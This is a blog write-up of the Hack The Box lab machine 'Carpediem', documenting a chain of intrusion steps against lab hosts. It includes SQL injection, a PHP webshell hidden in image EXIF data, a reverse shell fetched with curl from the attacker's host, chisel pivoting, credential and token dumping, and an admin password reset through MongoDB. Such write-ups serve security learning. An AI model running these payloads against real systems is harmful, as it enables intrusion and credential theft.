---
layout: single
title: Carpediem - Hack The Box
excerpt: "Carpediem is a hard-rated Linux machine from Hack The Box and probably one of the best, if not even the best, box I've done. This is a HUGE box with a lot of different containers and feels very real world. We have to pivot left and right, enumerate a lot and probably do 3-4 privilege escalations before we're finally root. Because of the big scope this box took me a few days to complete and I got stuck on several places along the way. The path to user was very fun and even incorporates VoIP as a vector, path to root introduced me to a new docker escape that was amazing - I can't wait to try it out in the real world! If you haven't done this box yet, make sure that you try it out."
date: 2022-09-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-carpediem/carpediem_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
  unreleased: true
categories:
  - hackthebox
tags:  
  - linux
  - hard
  - web
  - docker
  - tunneling
  - pivoting
  - mongodb
  - voip
  - pcap
  - release_agent
---

![](/assets/images/htb-writeup-carpediem/carpediem_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Carpediem is a hard-rated Linux machine from Hack The Box and probably one of the best, if not even the best, box I've done. This is a HUGE box with a lot of different containers and feels very real world. We have to pivot left and right, enumerate a lot and probably do 3-4 privilege escalations before we're finally root. Because of the big scope this box took me a few days to complete and I got stuck on several places along the way. The path to user was very fun and even incorporates VoIP as a vector, path to root introduced me to a new docker escape that was amazing - I can't wait to try it out in the real world! If you haven't done this box yet, make sure that you try it out.

----------------

# USER
### Step 1
```bash
➜  carpediem nmap -Pn -n -p- 10.10.11.167
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


➜  carpediem nmap -Pn -n -p22,80 -sCV 10.10.11.167
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)
|   256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)
|_  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Comming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
➜  webanalyze ./webanalyze -host http://10.10.11.167
http://10.10.11.167 (0.2s):
    Bootstrap,  (UI frameworks)
    Google Font API,  (Font scripts)
    Ubuntu,  (Operating systems)
    Nginx, 1.18.0 (Web servers, Reverse proxies)
```


Visiting `http://10.10.11.167` we find the domain `carpediem.htb` and a release count down, similar to the box _Player_.
![[/assets/images/htb-writeup-carpediem/carpediem01.png]]

Looking for vhosts we find `portal.carpediem.htb`:
```bash
➜  carpediem ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://carpediem.htb -H "Host: FUZZ.carpediem.htb" -fs 2875
portal                  [Status: 200, Size: 31090, Words: 7687, Lines: 463, Duration: 104ms]
```

`http://portal.carpediem.htb` is a unexpected motorcycle shop. 
![[/assets/images/htb-writeup-carpediem/carpediem02.png]]

Looking around on the `portal` page we have a lot of parameters to fuzz, starting with `search` I find nothing. Next moving on to `?p=` I'm able to create a loop which will exhaust the memory revealing the directory location:
![[/assets/images/htb-writeup-carpediem/carpediem03.png]]

Testing any other of the found parameters, example `uploads`, we get this message:
```php
Warning: include(uploads/index.php): failed to open stream: No such file or directory in /var/www/html/portal/index.php on line 14

Warning: include(): Failed opening 'uploads/index.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/portal/index.php on line 14
```

I'm unable to do anything of use with this information, so lets move on. 

```bash
➜  carpediem ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://portal.carpediem.htb/FUZZ/
.htaccess               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 71ms]
.htpasswd               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 75ms]
admin                   [Status: 200, Size: 27834, Words: 7052, Lines: 567, Duration: 89ms]
assets                  [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]
build                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 66ms]
classes                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 55ms]
dist                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 64ms]
icons                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]
inc                     [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]
libs                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]
plugins                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 41ms]
server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 68ms]
uploads                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]
```

Browsing to `/admin` we get a alert saying `Access Denied!`, trying to register a user account and testing again result in the same thing.

Playing around with the register function we can confirm that there is a user called `admin`:
![[/assets/images/htb-writeup-carpediem/carpediem04.png]]

We're able to break the SQL syntax by entering username `'ORDER BY 1--`:
![[/assets/images/htb-writeup-carpediem/carpediem05.png]]

Save the request to a file and fire up `sqlmap` to do the heavy lifting for you.
```bash
➜  carpediem sqlmap -r register.req -p username
[... snip ...]
[12:35:21] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
sqlmap identified the following injection point(s) with a total of 996 HTTP(s) requests:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: firstname=asdf&lastname=asdf&contact=asdf&gender=Male&address=asdf&username=injectpls'||(SELECT 0x62626476 WHERE 4087=4087 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(5583=5583,1))),0x71707a7a71),5583))||'&password=asdf
---
[12:35:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.25, Nginx 1.18.0
back-end DBMS: MySQL >= 5.6

➜  carpediem sqlmap -r register.req -p username --dbs
available databases [1]:
[*] portal
```

Sadly it stops there, we're unable to fetch tables and/or columns. I tried a lot of different common combinations such as table ``users`` and columns ``username,password`` but nothing. It looks like this might be a rabbit hole. Moving on to the next form, we can edit our user under `http://portal.carpediem.htb/?p=edit_account`. 

Doing a edit, we can see a new interesting parameter in Burp - `login_type=2`. Changing this to **1** and we're now able to access `/admin`
![[/assets/images/htb-writeup-carpediem/carpediem06.png]]

![[/assets/images/htb-writeup-carpediem/carpediem07.png]]


### Step 2
Going through the admin panel the options are slim, at first glance it looks like we have a lot of options but in reality they've removed all the _update/save_ buttons only giving access to few functions.

**(1)** We can create a new bike with text + image
**(2)** Edit previously created bikes
**(3)** Print a Booking Report PDF
**(4)** Edit our user profile and add avatar image

Looking on bookings we find 5 entries, and from the data a new name: `jhammond@carpediem.htb`.
Going to edit user profile I try to upload a malicious jpg containing php code, but this does nothing. 

We can bypass this by simply capturing the request in burp and removing `.jpg` from the request body, and the file will be uploaded as a ``.php``. 
```bash
➜  carpediem exiftool -DocumentName="<h1>0xPThree - exploit.se<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" exploit.jpg 
    1 image files updated
➜  carpediem mv exploit.jpg exploit.php.jpg
```

From Burp intercept change filename:
![[/assets/images/htb-writeup-carpediem/carpediem08.png]]

And our avatar should now be broken by the webshell.
![[/assets/images/htb-writeup-carpediem/carpediem09.png]]

Right-click the image, open in new tab, and start to enumerate the box and/or setup a reverse shell. 
![[/assets/images/htb-writeup-carpediem/carpediem10.png]]

The uploaded php file is removed after a few minutes, so create a simple reverse shell:
```bash
➜  carpediem echo "bash -i >& /dev/tcp/10.10.14.10/4488 0>&1" > rev.sh
➜  carpediem chmod +x rev.sh 
➜  carpediem python3 -m http.server 80

## Do a GET request to run 'rev.sh'
GET /uploads/1662983460_exploit.php?cmd=curl%20http://10.10.14.10/rev.sh|bash

➜  carpediem nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 46968
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3c371615b7aa:/var/www/html/portal/uploads$ id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
3c371615b7aa
```


### Step 3
Enumerate the victim machine and we can start by looking for SQL credentials.
```bash
www-data@3c371615b7aa:/var/www/html/portal/classes$ cat DBConnection.php
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = 'mysql';
    private $username = 'portaldb';
    private $password = 'J5tnqsXpyzkK4XNt';
    private $database = 'portal';
```

Looking around further we can see we're in a container. Upload `deepce.sh` to enumerate and it gives little to no info.. 
```bash
www-data@3c371615b7aa:/dev/shm$ bash deepce.sh
[... snip ...]
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] Docker Version .......... Version Unknown
[+] Dangerous Capabilities .. Unknown (capsh not installed)
[+] Privileged Mode ......... Unknown
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget
/usr/bin/gcc
/bin/hostname
/usr/bin/python3
```

In `env` we find additional credentials:
```bash
www-data@3c371615b7aa:/$ ./usr/bin/env
MYSQL_PORT_33060_TCP_ADDR=172.17.0.3
MYSQL_PORT=tcp://172.17.0.3:3306
MYSQL_PORT_3306_TCP_ADDR=172.17.0.3
MYSQL_NAME=/portal/mysql
MYSQL_ENV_MYSQL_ROOT_PASSWORD=3dQXeqjMHnq4kqDv
MYSQL_PORT_3306_TCP_PORT=3306
```

Upload `chisel` to the docker and setup a tunnel so we can use proxychains and reach `172.17.0.3:3306`
Note that I wasn't able to execute the binary in `/dev/shm` and had to move to `/tmp`
```bash
## Setup chisel server locally
➜  carpediem cat /etc/proxychains4.conf
[... snip ...]
socks5	127.0.0.1 5000
➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 4444 --reverse

## Connect with chisel client from victim
www-data@3c371615b7aa:/dev/shm$ wget http://10.10.14.10/chisel_1.7.7_linux_amd64
www-data@3c371615b7aa:/dev/shm$ chmod +x chisel_1.7.7_linux_amd64
www-data@3c371615b7aa:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.14.10:4444 R:5000:socks

## Verify connection with nmap
➜  carpediem proxychains nmap -sT --top-port 25 --open 172.17.0.3
[... snip ...]
PORT     STATE SERVICE
3306/tcp open  mysql
```

Login to the MySQL database and try to extract valuable information:
```bash
➜  carpediem proxychains mysql -h 172.17.0.3 -D portal -u portaldb -p
Enter password: J5tnqsXpyzkK4XNt

MySQL [portal]> show tables;
+------------------+
| Tables_in_portal |
+------------------+
| bike_list        |
| brand_list       |
| categories       |
| file_list        |
| rent_list        |
| system_info      |
| users            |
+------------------+

MySQL [portal]> select * from users where username = 'admin';
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
| id | firstname | lastname | gender | contact                | username | password                         | address | avatar                            | last_login | login_type | date_added          | date_updated        |
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
|  1 | Jeremy    | Hammond  | Male   | jhammond@carpediem.htb | admin    | b723e511b084ab84b44235d82da572f3 |         | uploads/1635793020_HONDA_XADV.png | NULL       |          1 | 2021-01-20 14:02:37 | 2022-04-01 23:34:50 |
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
```

Unfortunately we're not able to crack the hash using hashcat. 

Lets test the other set of credentials found in `/usr/bin/env`, we don't have a username so I'm guessing it's default `root`:
```bash
➜  carpediem proxychains mysql -h 172.17.0.3 -P 3306 -u root -p
Enter password: 3dQXeqjMHnq4kqDv

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| portal             |
| sys                |
+--------------------+
```

We find the same set of databases, so there's really no need to continue enumerating here.


### Step 4
Continue to enumerate the surrounding docker addresses for any more hints.

**172.17.0.2:**
```bash
➜  carpediem proxychains nmap -sT --top-port=200 --open 172.17.0.2
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https
```

Trying to access the FTP server we're able to login with `anonymous:anonymous` but we can't list any content:
```bash
➜  carpediem proxychains ftp 172.17.0.2
ftp> dir
500 Illegal PORT command.

ftp> pass
Passive mode: on; fallback to active mode: on.

ftp> dir
227 Entering Passive Mode (172,17,0,2,31,233).
[proxychains] Strict chain  ...  127.0.0.1:5000  ...  172.17.0.2:8169  ...  OK
150 Here comes the directory listing.
```

**172.17.0.4:**
```bash
➜  carpediem proxychains nmap -sT --open 172.17.0.4
N/A

➜  carpediem proxychains nmap -sT --top-port=5000 --open 172.17.0.4
PORT      STATE SERVICE
27017/tcp open  mongod
```

```bash
➜  carpediem proxychains mongo 172.17.0.4 
> show databases;
admin    0.000GB
config   0.000GB
local    0.000GB
trudesk  0.001GB

> use trudesk;
switched to db trudesk

> show tables;
accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes

> db.accounts.find()
{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS", "fullname" : "Robert Frost", "email" : "rfrost@carpediem.htb", "role" : ObjectId("623c8b20855cc5001a8ba138"), "title" : "Sr. Network Engineer", "accessToken" : "22e56ec0b94db029b07365d520213ef6f5d3d2d9", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:30:32.198Z") }
{ "_id" : ObjectId("6243c0be1e0d4d001b0740d4"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jhammond", "email" : "jhammond@carpediem.htb", "password" : "$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq", "fullname" : "Jeremy Hammond", "title" : "Sr. Systems Engineer", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "a0833d9a06187dfd00d553bd235dfe83e957fd98", "__v" : 0, "lastOnline" : ISODate("2022-04-01T23:36:55.940Z") }
{ "_id" : ObjectId("6243c28f1e0d4d001b0740d6"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jpardella", "email" : "jpardella@carpediem.htb", "password" : "$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK", "fullname" : "Joey Pardella", "title" : "Desktop Support", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "7c0335559073138d82b64ed7b6c3efae427ece85", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:33:20.918Z") }
{ "_id" : ObjectId("6243c3471e0d4d001b0740d7"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "acooke", "email" : "acooke@carpediem.htb", "password" : "$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.", "fullname" : "Adeanna Cooke", "title" : "Director - Human Resources", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "9c7ace307a78322f1c09d62aae3815528c3b7547", "__v" : 0, "lastOnline" : ISODate("2022-03-30T14:21:15.212Z") }
{ "_id" : ObjectId("6243c69d1acd1559cdb4019b"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "svc-portal-tickets", "email" : "tickets@carpediem.htb", "password" : "$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW", "fullname" : "Portal Tickets", "title" : "", "role" : ObjectId("623c8b20855cc5001a8ba13a"), "accessToken" : "f8691bd2d8d613ec89337b5cd5a98554f8fffcc4", "__v" : 0, "lastOnline" : ISODate("2022-03-30T13:50:02.824Z") }
```

The found password hashes are all bcrypt and we will not be able to crack those, instead the ``accessToken`` seems interesting. 

Before moving on, lets see if we can find anything interesting from the reported tickets. Below is the heavily cropped data from table `tickets`:
```mysql
> db.tickets.find().pretty()
{
	"_id" : ObjectId("624461a6f2c8c07f687ba8a6"),
	"subject" : "Security risks - Portal",
	"issue" : "<p>We need to patch the user profile and admin sections of our Portal ASAP. Why are we continually pushing out functions that haven&#39;t been tested by the Infosec team?</p>\n",
			"comment" : "<p>Thanks, Jeremy.  I agree.  This is a big problem.</p>\n"
}
{
	"_id" : ObjectId("6244635c8fc3556ae8715b0f"),
	"subject" : "Username change",
	"issue" : "<p>I need a handle, man.  I mean, I don&#39;t have an identity until I have a handle.<br />How about The Master of Disaster?</p>\n",
			"comment" : "<p>You&#39;re hopelss, man.  Utterly hopeless.</p>\n<p>I&#39;m closing this ticket.</p>\n"
}
{
	"_id" : ObjectId("624465135596178468330932"),
	"issue" : "<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>\n",
			"comment" : "<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n"
			"comment" : "<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>\n"
			"comment" : "<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>\n"
}
{
	"_id" : ObjectId("6244673c2142479dd493d9da"),
	"subject" : "Trudesk API access - Portal",
	"issue" : "<p>I&#39;ll be looking into tightenting up security permissions this week for the Trudesk integration in the Portal.  We&#39;ll need to also perform some threat modeling to find out where our weak points are and come up with an action plan to mitigate.</p>\n",
}
{
	"_id" : ObjectId("62478d83eadb13001b66b62c"),
	"subject" : "Need help building the CMS",
	"issue" : "<p>Hey Jeremy, <br />Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.</p>\n",
			"comment" : "<p>Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.<br>Build it out if you&#39;d like, but...just don&#39;t do anything stupid.</p>\n"
			"comment" : "<p>Don&#39;t worry. I moved it off of the main server and into a container with SSL encryption.</p>\n"

}
```

The information about the new Network Engineer and the last 4 digits of his employee ID, 9650, and pincode, 2022, might come in handy later. Lets move on with the extracted accessTokens. 

### Step 5
Setup Burp for upstream socks proxy (User options > SOCKS Proxy) and browse to `https://172.17.0.2` we find `backdrop.carpediem.htb`. 
![[/assets/images/htb-writeup-carpediem/carpediem11.png]]


We're unable to login to the page and there really isn't anything of use at first glance. Googling for _"backdrop cms exploit"_ there are a bunch of authenticated exploits, but we have no account..

![[/assets/images/htb-writeup-carpediem/carpediem12.png]]
We'd love to find something related to _trudesk_, lets try to add `trudesk.carpediem.htb` to resolve to `172.17.0.2` and if that doesn't work try `10.10.11.167`.

```bash
➜  chisel_1.7.7 curl -v http://trudesk.carpediem.htb
*   Trying 10.10.11.167:80...
* Connected to trudesk.carpediem.htb (10.10.11.167) port 80 (#0)
> GET / HTTP/1.1
> Host: trudesk.carpediem.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 13 Sep 2022 07:26:47 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 7285
< Connection: keep-alive
< Access-Control-Allow-Origin: *
< Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
< Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token
< ETag: W/"1c75-WUVJYgy+76qLc2hldkHzGR7+Uxg"
< set-cookie: connect.sid=s%3AQDzVdnp3FNH7sE1ZglF0wWughDr5QhjC.hjY40%2Blgy48wMb6w4wRA0QLCPSYevILsPC0ClelRiMg; Path=/; Expires=Wed, 13 Sep 2023 07:26:47 GMT; HttpOnly
< 
<!DOCTYPE html>
<html>
<head>
    <title>Trudesk &middot; Login</title>
```

```bash
➜  carpediem ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://trudesk.carpediem.htb/FUZZ
About                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 65ms]
Login                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 67ms]
about                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 86ms]
accounts                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]
api                     [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 75ms]
backups                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 83ms]
captcha                 [Status: 200, Size: 9399, Words: 954, Lines: 1, Duration: 120ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 87ms]
dashboard               [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 145ms]
departments             [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 84ms]
font                    [Status: 301, Size: 175, Words: 7, Lines: 11, Duration: 43ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 43ms]
groups                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 133ms]
img                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 61ms]
install                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 69ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 99ms]
login                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 62ms]
logout                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]
messages                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 96ms]
mobile                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 158ms]
notices                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 106ms]
plugins                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 64ms]
profile                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 102ms]
register                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 103ms]
reports                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 115ms]
settings                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 93ms]
signup                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 73ms]
sounds                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 100ms]
teams                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 152ms]
tickets                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 97ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 68ms]
version                 [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 58ms]
```

```bash
➜  carpediem curl http://trudesk.carpediem.htb/version
{"version":"1.1.11"}
```

Googling around I can't find any publicly disclosed exploits for Trudesk 1.1.11. 
Reading the [truedesk docs](https://docs.trudesk.io/v1/api/#Get) we should use the ``accessToken`` as a header, we can verify this by cURL'ign the API using the admin accesstoken:

```bash
➜  carpediem curl -H "accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9" -l http://trudesk.carpediem.htb/api/v1/users
{"success":true,"count":5,"users":[{"preferences":{"tourCompleted":false,"autoRefreshTicketGrid":true,"openChatWindows":[]},"hasL2Auth":false,"deleted":false,"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"},"lastOnline":"2022-03-30T14:21:15.212Z","id":"6243c3471e0d4d001b0740d7","groups":[]},{"preferences":{"tourCompleted":false,"autoRefreshTicketGrid":true,"openChatWindows":[]},"hasL2Auth":false,"deleted":false,"_id":"6243c0be1e0d4d001b0740d4","username":"jhammond","email":"jhammond@carpediem.htb","fullname":"Jeremy Hammond","title":"Sr. Systems Engineer","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"},"lastOnline":"2022-04-01T23:36:55.940Z","id":"6243c0be1e0d4d001b0740d4","groups":[]},{"preferences":{"tourCompleted":false,"autoRefreshTicketGrid":true,"openChatWindows":[]},"hasL2Auth":false,"deleted":false,"_id":"6243c28f1e0d4d001b0740d6","username":"jpardella","email":"jpardella@carpediem.htb","fullname":"Joey Pardella","title":"Desktop Support","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"},"lastOnline":"2022-04-07T20:33:20.918Z","id":"6243c28f1e0d4d001b0740d6","groups":[]},{"preferences":{"tourCompleted":false,"autoRefreshTicketGrid":true,"openChatWindows":[]},"hasL2Auth":false,"deleted":false,"_id":"6243c69d1acd1559cdb4019b","username":"svc-portal-tickets","email":"tickets@carpediem.htb","fullname":"Portal Tickets","title":"","role":{"_id":"623c8b20855cc5001a8ba13a","name":"User","description":"Default role for users","normalized":"user","isAdmin":false,"isAgent":false,"id":"623c8b20855cc5001a8ba13a"},"lastOnline":"2022-03-30T13:50:02.824Z","id":"6243c69d1acd1559cdb4019b","groups":[]},{"preferences":{"tourCompleted":false,"autoRefreshTicketGrid":true,"openChatWindows":[]},"hasL2Auth":false,"deleted":false,"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer","lastOnline":"2022-04-07T20:30:32.198Z","id":"623c8b20855cc5001a8ba13c","groups":[]}]}
```

With the help of Burp extension _Add Custom Header_ add the accessToken and add it to all sessions (Project Options > Sessions > Session Handling Rules > Invoke a Burp extension ), don't forget to add the rule to be applied to _Proxy_ as well. 

![[/assets/images/htb-writeup-carpediem/carpediem13.png]]

We're not able to bypass the login, so I guess we should focus on the api instead. 


### Step 6
Playing around with the API we have a few options, lets start by trying to change the password of the _admin_ account.
```bash
➜  carpediem curl -X PUT -H "Content-Type: applications/json" -H "accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9" -d "{"aPass":"aaAA123\!", "aPassconfirm":"aaAA123\!"}" -l http://trudesk.carpediem.htb/api/v1/users/admin  

{"success":true,"user":{"preferences":{"tourCompleted":false,"autoRefreshTicketGrid":true,"openChatWindows":[]},"hasL2Auth":false,"deleted":false,"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"grants":["admin:*","agent:*","chat:*","tickets:*","accounts:*","groups:*","teams:*","departments:*","comments:*","reports:*","notices:*","settings:*","api:*"],"hierarchy":true,"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","__v":0,"isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer","lastOnline":"2022-04-07T20:30:32.198Z","groups":[]}}% 
```

Even though we get `"success":true` trying to login it still says that the password is incorrect.. 
But we do have access to the mongodb, maybe it would be easier to just change password in there. 

To generate a new bcrypt password I found this [amazing one-liner](https://unix.stackexchange.com/questions/307994/compute-bcrypt-hash-from-command-line) where we (ab)use ``htpasswd``:
```bash
➜  carpediem htpasswd -bnBC 10 "" asdf123 | tr -d ':\n' | sed 's/$2y/$2b/'
$2b$10$xI/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO
```

```bash
> db.accounts.updateOne(
... { "username" : "admin" },
... { $set:
... { "password" : "$2b$10$xI/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO" }
... }
... )

{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }
```

We're now able to login to the application `http://trudesk.carpediem.htb`:
![[/assets/images/htb-writeup-carpediem/carpediem14.png]]

Looking around we don't find anything new, information wise. Trying to change user avatar to a malicious one fails, as they move and rename the file on upload. 
The only interesting information we gain here is the soft phone name _"Zoiper"_, maybe there's a vhost for that as well. I can't find any web interface for Zoiper, so instead we [download](https://www.zoiper.com/en/voip-softphone/download/current) it locally and try if we can connect to their server.

We have the name of the new employee, Horace Flaccus (``hflaccus``), his pin is 2022, his extension is 9650 and dial ``*62`` to reach voicemail.

```bash
➜  Downloads sudo dpkg -i Zoiper5_5.5.13_x86_64.deb
```

Enter username `9650` and password `2022`, when asked to fill in your hostname set it to `carpediem.htb`. 
![[/assets/images/htb-writeup-carpediem/carpediem15.png]]

![[/assets/images/htb-writeup-carpediem/carpediem16.png]]

